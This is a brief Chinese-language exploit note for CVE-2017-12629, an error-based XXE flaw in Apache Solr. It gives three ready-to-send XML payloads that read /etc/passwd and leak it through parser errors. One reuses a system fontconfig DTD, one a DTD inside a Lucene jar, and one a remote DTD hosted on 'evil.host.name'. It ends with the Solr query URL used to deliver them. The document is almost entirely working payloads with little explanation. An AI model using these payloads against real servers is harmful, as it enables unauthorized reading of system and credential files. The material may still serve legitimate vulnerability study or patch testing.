# CVE-2017-12629-XXE

一个Error Based XXE，3种利用方式



1. 利用操作系统上已有的dtd文件。比如Docker官方openjdk镜像，其安装了fontconfig-config这个包，这个包就包含一个dtd文件/usr/share/xml/fontconfig/fonts.dtd：

   ```xml
   <?xml version="1.0" ?>
   <!DOCTYPE message [
       <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
   
       <!ENTITY % expr 'aaa)>
           <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
           <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
           &#x25;eval;
           &#x25;error;
           <!ELEMENT aa (bb'>
   
       %local_dtd;
   ]>
   <message>any text</message>
   ```

   

2. 利用应用内部的dtd文件。比如比如Solr依赖的lucene-queryparser.jar中包含的LuceneCoreQuery.dtd：

   ```xml
   <?xml version="1.0" ?>
   <!DOCTYPE message [
       <!ENTITY % local_dtd SYSTEM "jar:file:///opt/solr/server/solr-webapp/webapp/WEB-INF/lib/lucene-queryparser-7.0.1.jar!/org/apache/lucene/queryparser/xml/LuceneCoreQuery.dtd">
   
       <!ENTITY % queries 'aaa)>
           <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
           <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
           &#x25;eval;
           &#x25;error;
           <!ELEMENT aa (bb'>
   
       %local_dtd;
   ]>
   <message>any text</message>
   ```

   

3. 利用远程dtd文件（出网）

   ```xml
   #服务器上放一个dtd
   
   <!ENTITY % test "example">
   <!ELEMENT pattern (%test;)>
   
   ```

   

   


   ```xml
   <?xml version="1.0" ?>
   <!DOCTYPE message [
       <!ENTITY % local_dtd SYSTEM "http://evil.host.name/include.dtd">
   
       <!ENTITY % test 'aaa)>
           <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
           <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
           &#x25;eval;
           &#x25;error;
           <!ELEMENT aa (bb'>
   
       %local_dtd;
   ]>
   <message>any text</message>
   ```

   

   





url编码后访问`http://localhost:8983/solr/demo/select?wt=xml&defType=xmlparser&q=xxxxxxxxxxxxxxx`

